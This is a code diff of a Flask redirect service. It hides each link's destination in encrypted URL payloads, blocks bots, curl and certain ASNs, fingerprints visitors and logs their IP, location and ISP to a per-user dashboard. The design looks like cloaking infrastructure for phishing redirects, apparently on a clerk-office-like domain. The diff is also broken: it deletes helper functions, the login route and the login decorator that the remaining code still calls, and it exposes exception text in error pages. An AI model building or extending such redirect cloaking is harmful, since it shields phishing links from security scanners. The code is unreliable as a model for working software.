@@ -428,10 +428,15 @@ def decrypt_slugstorm(encrypted):
             raise ValueError("Invalid payload format")
         data_b64 = parts[0]
         sig_b64 = parts[-1]
-        data = base64.urlsafe_b64decode(data_b64).decode()
+        try:
+            data = base64.urlsafe_b64decode(data_b64).decode('utf-8')
+        except UnicodeDecodeError as e:
+            logger.warning(f"UTF-8 decode failed: {str(e)}, trying latin1")
+            data = base64.urlsafe_b64decode(data_b64).decode('latin1', errors='ignore')
+        logger.debug(f"SlugStorm raw decoded data: {data[:50]}...")
         signature = base64.urlsafe_b64decode(sig_b64)
         h = hmac.HMAC(HMAC_KEY, hashes.SHA256(), backend=default_backend())
-        h.update(data.encode())
+        h.update(data.encode('utf-8'))
         h.verify(signature)
         data = json.loads(data)
         if data['expires'] < int(time.time() * 1000):
@@ -443,24 +448,29 @@ def decrypt_slugstorm(encrypted):
         logger.error(f"SlugStorm decryption error: {str(e)}", exc_info=True)
         raise ValueError("Invalid payload")
 
-def encrypt_pow(payload):
+def decrypt_heap_x3(encrypted):
     try:
-        iv = secrets.token_bytes(16)  # Fixed nonce size to 16 bytes for ChaCha20
-        cipher = Cipher(algorithms.ChaCha20(ENCRYPTION_KEY, iv), backend=default_backend())
-        encryptor = cipher.encryptor()
-        data = payload.encode()
-        ciphertext = encryptor.update(data) + encryptor.finalize()
-        result = base64.urlsafe_b64encode(iv + ciphertext).decode()
-        logger.debug(f"PoW encrypted payload: {result[:20]}...")
+        parts = encrypted.split('.')
+        if len(parts) < 1:
+            raise ValueError("Invalid payload format")
+        encrypted = base64.urlsafe_b64decode(parts[0])
+        iv = encrypted[:12]
+        tag = encrypted[-16:]
+        ciphertext = encrypted[12:-16]
+        cipher = Cipher(algorithms.AES(ENCRYPTION_KEY), modes.GCM(iv, tag), backend=default_backend())
+        decryptor = cipher.decryptor()
+        decrypted = decryptor.update(ciphertext) + decryptor.finalize()
+        result = json.loads(decrypted.decode())
+        logger.debug(f"HEAP X3 decrypted payload: {json.dumps(result)[:50]}...")
         return result
     except Exception as e:
-        logger.error(f"PoW encryption error: {str(e)}", exc_info=True)
-        raise ValueError("Encryption failed")
+        logger.error(f"HEAP X3 decryption error: {str(e)}", exc_info=True)
+        raise ValueError("Invalid payload")
 
 def decrypt_pow(encrypted):
     try:
         encrypted = base64.urlsafe_b64decode(encrypted)
-        iv = encrypted[:16]  # Fixed nonce size to 16 bytes
+        iv = encrypted[:16]
         ciphertext = encrypted[16:]
         cipher = Cipher(algorithms.ChaCha20(ENCRYPTION_KEY, iv), backend=default_backend())
         decryptor = cipher.decryptor()
@@ -471,114 +481,29 @@ def decrypt_pow(encrypted):
         logger.error(f"PoW decryption error: {str(e)}", exc_info=True)
         raise ValueError("Invalid payload")
 
-def encrypt_signed_token(payload):
+@app.route("/<endpoint>/<path:encrypted_payload>/<path:path_segment>", methods=["GET"], subdomain="<username>")
+@rate_limit(limit=5, per=60)
+def redirect_handler(username, endpoint, encrypted_payload, path_segment):
     try:
-        data = payload.encode()
-        h = hmac.HMAC(HMAC_KEY, hashes.SHA256(), backend=default_backend())
-        h.update(data)
-        signature = h.finalize()
-        result = f"{base64.urlsafe_b64encode(data).decode()}.{base64.urlsafe_b64encode(signature).decode()}"
-        logger.debug(f"Signed Token encrypted payload: {result[:20]}...")
-        return result
-    except Exception as e:
-        logger.error(f"Signed Token encryption error: {str(e)}", exc_info=True)
-        raise ValueError("Encryption failed")
-
-def decrypt_signed_token(encrypted):
-    try:
-        parts = encrypted.split('.')
-        if len(parts) != 2:
-            raise ValueError("Invalid signed token format")
-        data_b64, sig_b64 = parts
-        data = base64.urlsafe_b64decode(data_b64)
-        signature = base64.urlsafe_b64decode(sig_b64)
-        h = hmac.HMAC(HMAC_KEY, hashes.SHA256(), backend=default_backend())
-        h.update(data)
-        h.verify(signature)
-        result = data.decode()
-        logger.debug(f"Signed Token decrypted payload: {result[:50]}...")
-        return result
-    except Exception as e:
-        logger.error(f"Signed Token decryption error: {str(e)}", exc_info=True)
-        raise ValueError("Invalid payload")
-
-def get_valid_usernames():
-    try:
-        if valkey_client:
-            cached = valkey_client.get("usernames")
-            if cached:
-                logger.debug("Retrieved usernames from Valkey cache")
-                return json.loads(cached)
-        response = requests.get(USER_TXT_URL)
-        response.raise_for_status()
-        usernames = [bleach.clean(line.strip()) for line in response.text.splitlines() if line.strip()]
-        if valkey_client:
-            try:
-                valkey_client.setex("usernames", 3600, json.dumps(usernames))
-                logger.debug("Cached usernames in Valkey")
-            except Exception as e:
-                logger.error(f"Valkey error caching usernames: {str(e)}")
-        logger.debug(f"Fetched {len(usernames)} usernames from GitHub")
-        return usernames
-    except Exception as e:
-        logger.error(f"Error fetching user.txt: {str(e)}", exc_info=True)
-        return []
-
-def login_required(f):
-    @wraps(f)
-    def decorated_function(*args, **kwargs):
-        try:
-            if 'username' not in session:
-                logger.debug(f"Redirecting to login from {request.url}, session: {session}")
-                return redirect(url_for('login', next=request.url))
-            logger.debug(f"Authenticated user: {session['username']}, session: {session}")
-            return f(*args, **kwargs)
-        except Exception as e:
-            logger.error(f"Error in login_required: {str(e)}", exc_info=True)
-            return redirect(url_for('login'))
-    return decorated_function
-
-def get_base_domain():
-    try:
-        host = request.host
-        parts = host.split('.')
-        if len(parts) >= 2:
-            return '.'.join(parts[-2:])
-        return host
-    except Exception as e:
-        logger.error(f"Error getting base domain: {str(e)}")
-        return "nvclerks.com"
-
-@app.before_request
-def block_ohio_subdomain():
-    try:
-        if request.host == 'ohioautocollection.nvclerks.com':
-            logger.debug(f"Redirecting request to {request.host} to https://google.com")
-            return redirect("https://google.com", code=302)
-    except Exception as e:
-        logger.error(f"Error in block_ohio_subdomain: {str(e)}", exc_info=True)
-
-@app.before_request
-def log_visitor():
-    try:
-        if request.path.startswith(('/static', '/challenge', '/fingerprint', '/denied')):
-            return
-        username = session.get('username', 'default')
+        base_domain = get_base_domain()
         user_agent = request.headers.get("User-Agent", "")
         ip = request.remote_addr
         headers = request.headers
         referer = headers.get("Referer", "")
         session_start = session.get('session_start', int(time.time()))
         session['session_start'] = session_start
+        logger.debug(f"Redirect handler called: username={username}, base_domain={base_domain}, endpoint={endpoint}, "
+                     f"encrypted_payload={encrypted_payload[:20]}..., path_segment={path_segment}, "
+                     f"IP={ip}, User-Agent={user_agent}, URL={request.url}")
 
+        is_bot_flag, bot_reason = is_bot(user_agent, headers, ip, request.path)
+        asn_blocked = check_asn(ip)
         device_info = get_device_info(user_agent)
         device_type = device_info['device_type']
         screen_type = device_info['screen_type']
         app = device_info['application']
-
-        is_bot_flag, bot_reason = is_bot(user_agent, headers, ip, request.path)
         visit_type = "Human"
-        if is_bot_flag:
+        if is_bot_flag or asn_blocked:
             visit_type = "Bot" if "curl/" in user_agent.lower() else "Mimicry" if "Mimicry" in bot_reason else "Bot"
         elif app != "Not Available" and app != device_info['application']:
             visit_type = "App"
@@ -588,139 +513,131 @@ def log_visitor():
         timestamp = int(time.time())
         visitor_id = hashlib.sha256(f"{ip}{timestamp}".encode()).hexdigest()
 
+        url_id = hashlib.sha256(request.url.encode()).hexdigest()
         if valkey_client:
             try:
-                valkey_client.hset(f"user:{username}:visitor:{visitor_id}", mapping={
-                    "timestamp": timestamp,
-                    "ip": ip,
-                    "country": location['country'],
-                    "country_code": location['country_code'],
-                    "region": location['region'],
-                    "region_code": location['region_code'],
-                    "city": location['city'],
-                    "zip": location['zip'],
-                    "latitude": str(location['latitude']),
-                    "longitude": str(location['longitude']),
-                    "isp": location['isp'],
-                    "organization": location['organization'],
-                    "as_number": location['as_number'],
-                    "timezone": location['timezone'],
-                    "device_type": device_type,
-                    "screen_type": screen_type,
-                    "application": app,
-                    "user_agent": user_agent,
-                    "bot_status": visit_type,
-                    "block_reason": bot_reason if is_bot_flag else "N/A",
-                    "referer": referer,
-                    "source": 'referral' if referer else 'direct',
-                    "session_duration": session_duration
-                })
-                valkey_client.zadd(f"user:{username}:visitor_log", {visitor_id: timestamp})
-                valkey_client.expire(f"user:{username}:visitor:{visitor_id}", DATA_RETENTION_DAYS * 86400)
-                valkey_client.zremrangebyrank(f"user:{username}:visitor_log", 0, -1001)
-                logger.debug(f"Logged visitor: {visitor_id} for user: {username} at timestamp: {timestamp}")
+                analytics_enabled = valkey_client.hget(f"user:{username}:url:{url_id}", "analytics_enabled") == "1"
+                if analytics_enabled:
+                    valkey_client.hset(f"user:{username}:visitor:{visitor_id}", mapping={
+                        "timestamp": timestamp,
+                        "ip": ip,
+                        "country": location['country'],
+                        "country_code": location['country_code'],
+                        "region": location['region'],
+                        "region_code": location['region_code'],
+                        "city": location['city'],
+                        "zip": location['zip'],
+                        "latitude": str(location['latitude']),
+                        "longitude": str(location['longitude']),
+                        "isp": location['isp'],
+                        "organization": location['organization'],
+                        "as_number": location['as_number'],
+                        "timezone": location['timezone'],
+                        "device_type": device_type,
+                        "screen_type": screen_type,
+                        "application": app,
+                        "user_agent": user_agent,
+                        "bot_status": visit_type,
+                        "block_reason": bot_reason if is_bot_flag or asn_blocked else "N/A",
+                        "referer": referer,
+                        "source": 'referral' if referer else 'direct',
+                        "session_duration": session_duration
+                    })
+                    valkey_client.zadd(f"user:{username}:visitor_log", {visitor_id: timestamp})
+                    valkey_client.expire(f"user:{username}:visitor:{visitor_id}", DATA_RETENTION_DAYS * 86400)
+                    valkey_client.hincrby(f"user:{username}:url:{url_id}", "clicks", 1)
+                    valkey_client.lpush(f"user:{username}:url:{url_id}:visits", json.dumps({
+                        "timestamp": timestamp,
+                        "ip": ip,
+                        "device_type": device_type,
+                        "screen_type": screen_type,
+                        "app": app,
+                        "type": visit_type,
+                        "location": location
+                    }))
+                    valkey_client.expire(f"user:{username}:url:{url_id}:visits", DATA_RETENTION_DAYS * 86400)
+                    logger.debug(f"Logged visit for URL ID: {url_id}, visitor: {visitor_id}")
             except Exception as e:
-                logger.error(f"Valkey error logging visitor: {str(e)}", exc_info=True)
-    except Exception as e:
-        logger.error(f"Error in log_visitor: {str(e)}", exc_info=True)
+                logger.error(f"Valkey error logging visit: {str(e)}", exc_info=True)
 
-@app.route("/login", methods=["GET", "POST"])
-@rate_limit(limit=5, per=60)
-def login():
-    try:
-        logger.debug(f"Accessing /login, method: {request.method}, next: {request.args.get('next', '')}, session: {session}")
-        form = LoginForm()
-        if form.validate_on_submit():
-            username = bleach.clean(form.username.data.strip())
-            logger.debug(f"Login attempt with username: {username}")
-            valid_usernames = get_valid_usernames()
-            if username in valid_usernames:
-                session['username'] = username
-                session.permanent = True
-                session.modified = True
-                logger.debug(f"User {username} logged in, session: {session}")
-                next_url = form.next_url.data or url_for('dashboard')
-                logger.debug(f"Redirecting to {next_url}")
-                return redirect(next_url)
-            logger.warning(f"Invalid login attempt: {username}")
-            form.username.errors.append("Invalid username. Please try again.")
-        return render_template_string("""
-            <!DOCTYPE html>
-            <html lang="en">
-            <head>
-                <meta charset="UTF-8">
-                <meta name="viewport" content="width=device-width, initial-scale=1.0">
-                <meta name="robots" content="noindex, nofollow">
-                <title>Login</title>
-                <script src="https://cdn.tailwindcss.com"></script>
-                <style>
-                    body { background: linear-gradient(to right, #4f46e5, #7c3aed); }
-                    .container { animation: fadeIn 1s ease-in; }
-                    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
-                </style>
-                <script>
-                    function sendChallenge() {
-                        let challenge = 0;
-                        for (let i = 0; i < 1000; i++) challenge += Math.random();
-                        fetch('/challenge', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ challenge })
-                        }).then(response => {
-                            if (!response.ok) {
-                                console.error('Challenge failed:', response.status);
-                                setTimeout(sendChallenge, 1000);
-                            }
-                        }).catch(error => {
-                            console.error('Challenge error:', error);
-                            setTimeout(sendChallenge, 1000);
-                        });
-                    }
-                    function getCanvasFingerprint() {
-                        const canvas = document.createElement('canvas');
-                        const ctx = canvas.getContext('2d');
-                        ctx.textBaseline = 'top';
-                        ctx.font = '14px Arial';
-                        ctx.fillText('Fingerprint', 2, 2);
-                        return canvas.toDataURL();
-                    }
-                    window.onload = function() {
-                        sendChallenge();
-                        fetch('/fingerprint', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ fingerprint: getCanvasFingerprint() })
-                        }).catch(error => console.error('Fingerprint error:', error));
-                    };
-                </script>
-            </head>
-            <body class="min-h-screen flex items-center justify-center p-4">
-                <div class="container bg-white p-8 rounded-xl shadow-2xl max-w-md w-full">
-                    <h1 class="text-3xl font-extrabold mb-6 text-center text-gray-900">Login</h1>
-                    {% if form.errors %}
-                        <p class="text-red-600 mb-4 text-center">
-                            {% for field, errors in form.errors.items() %}
-                                {% for error in errors %}
-                                    {{ error }}<br>
-                                {% endfor %}
-                            {% endfor %}
-                        </p>
-                    {% endif %}
-                    <form method="POST" class="space-y-5">
-                        {{ form.csrf_token }}
-                        {{ form.next_url(value=request.args.get('next', '')) }}
-                        <div>
-                            <label class="block text-sm font-medium text-gray-700">Username</label>
-                            {{ form.username(class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition") }}
-                        </div>
-                        {{ form.submit(class="w-full bg-indigo-600 text-white p-3 rounded-lg hover:bg-indigo-700 transition") }}
-                    </form>
-                </div>
-            </body>
-            </html>
-        """, form=form)
+        if is_bot_flag or asn_blocked:
+            logger.warning(f"Blocked redirect for IP {ip}: {bot_reason}")
+            abort(403, f"Access denied: {bot_reason}")
+
+        try:
+            encrypted_payload = urllib.parse.unquote(encrypted_payload)
+            logger.debug(f"Decoded encrypted_payload: {encrypted_payload[:20]}...")
+        except Exception as e:
+            logger.error(f"Error decoding encrypted_payload: {str(e)}", exc_info=True)
+            abort(400, "Invalid payload format")
+
+        # Check cached payload in Valkey
+        payload = None
+        if valkey_client:
+            try:
+                cached_payload = valkey_client.get(f"url_payload:{url_id}")
+                if cached_payload:
+                    payload = cached_payload
+                    logger.debug(f"Using cached payload for URL ID: {url_id}")
+            except Exception as e:
+                logger.error(f"Valkey error checking cached payload: {str(e)}", exc_info=True)
+
+        if not payload:
+            methods = ['slugstorm', 'heap_x3', 'pow', 'signed_token']
+            for method in methods:
+                try:
+                    logger.debug(f"Trying decryption method: {method}")
+                    if method == 'heap_x3':
+                        data = decrypt_heap_x3(encrypted_payload)
+                        payload = data['payload']
+                    elif method == 'slugstorm':
+                        data = decrypt_slugstorm(encrypted_payload)
+                        payload = data['payload']
+                    elif method == 'pow':
+                        payload = decrypt_pow(encrypted_payload)
+                    else:
+                        payload = decrypt_signed_token(encrypted_payload)
+                    logger.debug(f"Decryption successful with {method}")
+                    # Cache the payload in Valkey
+                    if valkey_client:
+                        try:
+                            expiry = json.loads(payload).get('expiry', int(time.time()) + 86400)
+                            ttl = max(1, int(expiry - time.time()))
+                            valkey_client.setex(f"url_payload:{url_id}", ttl, payload)
+                            logger.debug(f"Cached payload for URL ID: {url_id} with TTL {ttl}s")
+                        except Exception as e:
+                            logger.error(f"Valkey error caching payload: {str(e)}", exc_info=True)
+                    break
+                except Exception as e:
+                    logger.debug(f"Decryption failed with {method}: {str(e)}")
+                    continue
+
+        if not payload:
+            logger.error("All decryption methods failed")
+            abort(400, "Invalid payload")
+
+        try:
+            data = json.loads(payload)
+            redirect_url = data.get("student_link")
+            expiry = data.get("expiry", float('inf'))
+            if not redirect_url or not re.match(r"^https?://", redirect_url):
+                logger.error(f"Invalid redirect URL: {redirect_url}")
+                abort(400, "Invalid redirect URL")
+            if time.time() > expiry:
+                logger.warning("URL expired")
+                if valkey_client:
+                    valkey_client.delete(f"url_payload:{url_id}")
+                abort(410, "URL has expired")
+            logger.debug(f"Parsed payload: redirect_url={redirect_url}")
+        except Exception as e:
+            logger.error(f"Payload parsing error: {str(e)}", exc_info=True)
+            abort(400, "Invalid payload")
+
+        final_url = f"{redirect_url.rstrip('/')}/{path_segment}"
+        logger.info(f"Redirecting to {final_url}")
+        return redirect(final_url, code=302)
     except Exception as e:
-        logger.error(f"Error in login: {str(e)}", exc_info=True)
+        logger.error(f"Error in redirect_handler: {str(e)}", exc_info=True)
         return render_template_string("""
             <!DOCTYPE html>
             <html lang="en">
@@ -733,41 +650,12 @@ def login():
             <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
                 <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
                     <h3 class="text-lg font-bold mb-4 text-red-600">Internal Server Error</h3>
-                    <p class="text-gray-600">Something went wrong. Please try again later.</p>
+                    <p class="text-gray-600">Something went wrong: {{ error }}</p>
+                    <p class="text-gray-600">Please try again later or contact support.</p>
                 </div>
             </body>
             </html>
-        """), 500
-
-@app.route("/", methods=["GET"])
-@rate_limit(limit=5, per=60)
-def index():
-    try:
-        logger.debug(f"Accessing root URL, session: {'username' in session}, host: {request.host}")
-        if 'username' in session:
-            logger.debug(f"User {session['username']} redirecting to dashboard")
-            return redirect(url_for('dashboard'))
-        logger.debug("No user session, redirecting to login")
-        return redirect(url_for('login'))
-    except Exception as e:
-        logger.error(f"Error in index: {str(e)}", exc_info=True)
-        return render_template_string("""
-            <!DOCTYPE html>
-            <html lang="en">
-            <head>
-                <meta charset="UTF-8">
-                <meta name="viewport" content="width=device-width, initial-scale=1.0">
-                <title>Internal Server Error</title>
-                <script src="https://cdn.tailwindcss.com"></script>
-            </head>
-            <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
-                <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
-                    <h3 class="text-lg font-bold mb-4 text-red-600">Internal Server Error</h3>
-                    <p class="text-gray-600">Something went wrong. Please try again later.</p>
-                </div>
-            </body>
-            </html>
-        """), 500
+        """, error=str(e)), 500
 
 @app.route("/dashboard", methods=["GET", "POST"])
 @login_required
@@ -923,6 +811,8 @@ def dashboard():
                 logger.debug(f"Fetching visitor keys for user: {username}")
                 visitor_ids = valkey_client.zrevrange(f"user:{username}:visitor_log", 0, -1)
                 logger.debug(f"Found {len(visitor_ids)} visitor IDs")
+                if not visitor_ids:
+                    logger.warning(f"No visitor IDs found for user: {username}")
                 for visitor_id in visitor_ids:
                     try:
                         visitor_data = valkey_client.hgetall(f"user:{username}:visitor:{visitor_id}")
@@ -930,7 +820,7 @@ def dashboard():
                             logger.warning(f"Empty visitor data for ID {visitor_id}")
                             continue
                         source = 'referral' if visitor_data.get('referer') else 'direct'
-                        visitors.append({
+                        visitor_entry = {
                             "timestamp": datetime.fromtimestamp(int(visitor_data.get('timestamp', 0))).strftime('%Y-%m-%d %H:%M:%S') if visitor_data.get('timestamp') else 'Not Available',
                             "ip": visitor_data.get('ip', 'Not Available'),
                             "country": visitor_data.get('country', 'Not Available'),
@@ -953,7 +843,8 @@ def dashboard():
                             "block_reason": visitor_data.get('block_reason', 'N/A'),
                             "source": source,
                             "session_duration": int(visitor_data.get('session_duration', 0))
-                        })
+                        }
+                        visitors.append(visitor_entry)
                         if visitor_data.get('bot_status') != 'Human':
                             bot_logs.append({
                                 "timestamp": visitor_data.get('timestamp', 'Not Available'),
@@ -965,9 +856,9 @@ def dashboard():
                             bot_ratio['human'] += 1
                         traffic_sources[source] = traffic_sources.get(source, 0) + 1
                     except Exception as e:
-                        logger.error(f"Error processing visitor ID {visitor_id}: {str(e)}")
+                        logger.error(f"Error processing visitor ID {visitor_id}: {str(e)}", exc_info=True)
             except Exception as e:
-                logger.error(f"Valkey error fetching visitors: {str(e)}")
+                logger.error(f"Valkey error fetching visitors: {str(e)}", exc_info=True)
                 valkey_error = "Unable to fetch visitor data due to database error"
         else:
             logger.warning("Valkey unavailable, cannot fetch visitors")
@@ -989,7 +880,7 @@ def dashboard():
         theme_seed = hashlib.sha256(str(uuid.uuid4()).encode()).hexdigest()[:6]
         primary_color = f"#{theme_seed}"
 
-        logger.debug(f"Rendering dashboard template for user: {username}")
+        logger.debug(f"Rendering dashboard with {len(visitors)} visitors for user: {username}")
         return render_template_string("""
             <!DOCTYPE html>
             <html lang="en">
@@ -1239,7 +1130,7 @@ def dashboard():
                         </div>
                     </div>
                     <div id="visitors-tab" class="tab-content hidden">
-                        <div class="visitors-tab hidden">
+                        <div class="bg-white p-8 rounded-xl card">
                             <div class="flex justify-between items-center mb-4">
                                 <h2 class="text-2xl font-bold text-gray-900">Visitor Views</h2>
                                 <button onclick="refreshDashboard()" class="refresh-btn bg-blue-600 text-white px-4 py-2 rounded-lg hover:bg-blue-700">Refresh</button>
@@ -1259,13 +1150,13 @@ def dashboard():
                                                 <th>Zip</th>
                                                 <th>Latitude</th>
                                                 <th>Longitude</th>
-                                                <th>IAdmin</th>
-                                                <th>SOrganization</th>
-                                                <th>S Number</th>
-                                                    <th>Timezone</th>
-                                                    <th>Device Type</th>
-<th>Screen Type</th>
-<th>Application</th>
+                                                <th>ISP</th>
+                                                <th>Organization</th>
+                                                <th>AS Number</th>
+                                                <th>Timezone</th>
+                                                <th>Device Type</th>
+                                                <th>Screen Type</th>
+                                                <th>Application</th>
                                                 <th>User Agent</th>
                                                 <th>Bot Status</th>
                                                 <th>Block Reason</th>
@@ -1274,10 +1165,10 @@ def dashboard():
                                             </tr>
                                         </thead>
                                         <tbody>
-                                            {% for visitor in visits %}
+                                            {% for visitor in visitors %}
                                                 <tr class="{% if visitor.bot_status != 'Human' %}bot{% endif %}">
                                                     <td>{{ visitor.timestamp }}</td>
-                                                    <td>{{ visitor.id }}</td>
+                                                    <td>{{ visitor.ip }}</td>
                                                     <td>{{ visitor.country }}</td>
                                                     <td>{{ visitor.country_code }}</td>
                                                     <td>{{ visitor.region }}</td>
